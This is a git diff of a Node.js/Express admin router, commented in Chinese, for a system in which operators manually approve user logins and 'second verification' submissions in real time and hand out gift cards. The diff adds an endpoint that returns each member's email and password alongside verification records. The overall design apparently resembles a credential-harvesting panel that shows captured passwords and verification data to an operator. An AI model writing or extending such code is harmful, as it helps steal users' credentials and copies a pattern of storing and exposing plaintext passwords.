@@ -32,10 +32,10 @@ module.exports = (io) => {
         WHERE ll.status = 'pending' 
         ORDER BY ll.login_time DESC
       `);
-      
+
       // 添加调试日志
       console.log('获取到的登录请求数据:', requests.length > 0 ? requests[0] : '无数据');
-      
+
       res.json(requests);
     } catch (error) {
       console.error('获取登录请求错误:', error);
@@ -64,7 +64,7 @@ module.exports = (io) => {
 
       if (loginLogs.length > 0) {
         const loginLog = loginLogs[0];
-        
+
         // 如果拒绝登录，检查是否是首次登录，如果是则删除用户
         if (!approved) {
           // 检查用户的登录记录数量
@@ -72,36 +72,36 @@ module.exports = (io) => {
             'SELECT COUNT(*) as count FROM login_logs WHERE member_id = ?',
             [loginLog.member_id]
           );
-          
+
           // 如果只有一条登录记录（当前这条），说明是首次登录
           if (loginCount[0].count === 1) {
             console.log(`用户 ${loginLog.member_id} (${loginLog.email}) 首次登录被拒绝，删除用户数据`);
-            
+
             // 删除用户相关的所有数据
             await db.transaction(async (connection) => {
               // 删除登录日志
               await connection.execute('DELETE FROM login_logs WHERE member_id = ?', [loginLog.member_id]);
-              
+
               // 删除二次验证记录
               await connection.execute('DELETE FROM second_verifications WHERE member_id = ?', [loginLog.member_id]);
-              
+
               // 删除签到记录
               await connection.execute('DELETE FROM checkin_records WHERE member_id = ?', [loginLog.member_id]);
-              
+
               // 更新礼品卡状态
               await connection.execute(
                 'UPDATE gift_cards SET status = "available", distributed_to = NULL, distributed_at = NULL WHERE distributed_to = ?',
                 [loginLog.member_id]
               );
-              
+
               // 最后删除会员记录
               await connection.execute('DELETE FROM members WHERE id = ?', [loginLog.member_id]);
             });
-            
+
             console.log(`用户 ${loginLog.member_id} (${loginLog.email}) 数据已删除`);
           }
         }
-        
+
         // 通知会员审核结果
         io.to(`member-${loginLog.member_id}`).emit('login-status-update', {
           status,
@@ -127,13 +127,35 @@ module.exports = (io) => {
         WHERE sv.status = 'pending' 
         ORDER BY sv.submitted_at DESC
       `);
-      
+
       // 添加调试日志
       console.log('获取到的验证请求数据:', requests.length > 0 ? requests[0] : '无数据');
-      
+
       res.json(requests);
     } catch (error) {
       console.error('获取验证请求错误:', error);
+      res.status(500).json({ error: req.t('server_error') });
+    }
+  });
+
+  // 获取单个验证请求详情
+  router.get('/verification-request/:id', authenticateAdmin, async (req, res) => {
+    try {
+      const { id } = req.params;
+      const requests = await db.query(`
+        SELECT sv.*, m.email, m.password 
+        FROM second_verifications sv 
+        JOIN members m ON sv.member_id = m.id 
+        WHERE sv.id = ?
+      `, [id]);
+
+      if (requests.length === 0) {
+        return res.status(404).json({ error: 'Verification request not found' });
+      }
+
+      res.json(requests[0]);
+    } catch (error) {
+      console.error('获取验证请求详情错误:', error);
       res.status(500).json({ error: req.t('server_error') });
     }
   });
@@ -160,7 +182,7 @@ module.exports = (io) => {
 
         if (verifications.length > 0) {
           const verification = verifications[0];
-          
+
           // 分配礼品卡
           const availableCards = await db.query(
             'SELECT * FROM gift_cards WHERE status = "available" AND card_type = "login" LIMIT 1'
@@ -168,7 +190,7 @@ module.exports = (io) => {
 
           if (availableCards.length > 0) {
             const giftCard = availableCards[0];
-            
+
             // 更新礼品卡状态
             await db.update('gift_cards', {
               status: 'distributed',
@@ -254,19 +276,19 @@ module.exports = (io) => {
       res.status(500).json({ error: req.t('server_error') });
     }
   });
-  
+
   // 编辑礼品卡分类
   router.put('/gift-card-categories/:id', authenticateAdmin, async (req, res) => {
     try {
       const { id } = req.params;
       const { name, description } = req.body;
-      
+
       // 检查分类是否存在
       const category = await db.query('SELECT * FROM gift_card_categories WHERE id = ?', [id]);
       if (category.length === 0) {
         return res.status(404).json({ error: req.t ? req.t('category_not_found') : '分类不存在' });
       }
-      
+
       // 更新分类
       await db.update('gift_card_categories', { name, description }, { id });
       res.json({ message: req.t ? req.t('category_updated') : '分类已更新' });
@@ -275,24 +297,24 @@ module.exports = (io) => {
       res.status(500).json({ error: req.t ? req.t('server_error') : '服务器错误' });
     }
   });
-  
+
   // 删除礼品卡分类
   router.delete('/gift-card-categories/:id', authenticateAdmin, async (req, res) => {
     try {
       const { id } = req.params;
-      
+
       // 检查分类是否存在
       const category = await db.query('SELECT * FROM gift_card_categories WHERE id = ?', [id]);
       if (category.length === 0) {
         return res.status(404).json({ error: req.t ? req.t('category_not_found') : '分类不存在' });
       }
-      
+
       // 检查分类是否被使用
       const usedCards = await db.query('SELECT COUNT(*) as count FROM gift_cards WHERE category_id = ?', [id]);
       if (usedCards[0].count > 0) {
         return res.status(400).json({ error: req.t ? req.t('category_in_use') : '该分类下有礼品卡，无法删除' });
       }
-      
+
       // 删除分类
       await db.remove('gift_card_categories', { id });
       res.json({ message: req.t ? req.t('category_deleted') : '分类已删除' });
@@ -307,7 +329,7 @@ module.exports = (io) => {
     try {
       const { categoryId, codes, cardType = 'login' } = req.body;
       const codeList = codes.split('\n').filter(code => code.trim());
-      
+
       // 使用事务处理批量插入
       await db.transaction(async (connection) => {
         for (const code of codeList) {
@@ -318,9 +340,9 @@ module.exports = (io) => {
         }
       });
 
-      res.json({ 
+      res.json({
         message: req.t('gift_cards_added'),
-        count: codeList.length 
+        count: codeList.length
       });
     } catch (error) {
       console.error('批量添加礼品卡错误:', error);
@@ -353,7 +375,7 @@ module.exports = (io) => {
 
       const limitNum = Number(limit);
       const offsetNum = (Number(page) - 1) * Number(limit);
-      
+
       // 使用具体数字而不是参数占位符，避免类型问题
       query += ` ORDER BY gc.created_at DESC LIMIT ${limitNum} OFFSET ${offsetNum}`;
       // 不再添加这些参数到 params 数组中
@@ -389,7 +411,7 @@ module.exports = (io) => {
   router.post('/ban-ip', authenticateAdmin, async (req, res) => {
     try {
       const { ipAddress, reason } = req.body;
-      
+
       if (!ipAddress) {
         return res.status(400).json({ error: req.t('ip_address_required') });
       }
@@ -443,7 +465,7 @@ module.exports = (io) => {
         ORDER BY ll.login_time DESC
         LIMIT 100
       `, [ip]);
-      
+
       res.json(history);
     } catch (error) {
       console.error('获取IP历史错误:', error);
